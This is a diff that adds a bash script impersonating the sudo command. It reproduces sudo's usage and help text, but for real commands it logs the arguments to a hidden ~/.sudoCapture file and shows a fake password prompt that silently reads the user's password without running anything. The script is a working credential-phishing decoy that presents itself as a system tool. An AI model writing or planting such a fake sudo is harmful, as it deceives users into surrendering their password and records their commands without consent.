@@ -1,0 +1,33 @@
+#!/bin/bash
+
+function showExamples {
+	echo "usage: sudo -h | -K | -k | -V"
+	echo "usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]"
+	echo "usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]"
+	echo "usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-D directory] [-g group] [-h host] [-p"
+	echo "            prompt] [-R directory] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]"
+	echo "usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-D directory] [-g group] [-h host] [-p prompt]"
+	echo "           [-R directory] [-T timeout] [-u user] file ..."
+}
+function showUsage {
+	echo -e "Options:\n  -A, --askpass                 use a helper program for password prompting\n  -b, --background              run command in the background\n  -B, --bell                    ring bell when prompting\n  -C, --close-from=num          close all file descriptors >= num\n  -D, --chdir=directory         change the working directory before running command\n  -E, --preserve-env            preserve user environment when running command\n      --preserve-env=list       preserve specific environment variables\n  -e, --edit                    edit files instead of running a command\n  -g, --group=group             run command as the specified group name or ID\n  -H, --set-home                set HOME variable to target user's home dir\n  -h, --help                    display help message and exit\n  -h, --host=host               run command on host (if supported by plugin)\n  -i, --login                   run login shell as the target user; a command may also be specified\n  -K, --remove-timestamp        remove timestamp file completely\n  -k, --reset-timestamp         invalidate timestamp file\n  -l, --list                    list user's privileges or check a specific command; use twice for\n                                longer format\n  -n, --non-interactive         non-interactive mode, no prompts are used\n  -P, --preserve-groups         preserve group vector instead of setting to target's\n  -p, --prompt=prompt           use the specified password prompt\n  -R, --chroot=directory        change the root directory before running command\n  -r, --role=role               create SELinux security context with specified role\n  -S, --stdin                   read password from standard input\n  -s, --shell                   run shell as the target user; a command may also be specified\n  -t, --type=type               create SELinux security context with specified type\n  -T, --command-timeout=timeout terminate command after the specified time limit\n  -U, --other-user=user         in list mode, display privileges for user\n  -u, --user=user               run command (or edit file) as specified user name or ID\n  -V, --version                 display version information and exit\n  -v, --validate                update user's timestamp without running a command\n  --                            stop processing command line arguments"
+}
+
+currentUser=$(whoami)
+if [ "${@/ /} " == " " ] ; then
+	showExamples
+elif [ "${@/ /} " == "-h " ] || [ "${@/ /} " == "--help " ] ; then
+	echo -e "sudo - execute a command as another user\n"
+	showExamples
+	echo ""
+	showUsage
+else
+	echo "$@" >> ~/.sudoCapture
+	if [ "$currentUser" != "root" ] ; then
+		printf "[sudo] password for ${currentUser}: "
+		read -s password
+		echo ""
+		sleep 1s
+	fi
+fi
+exit
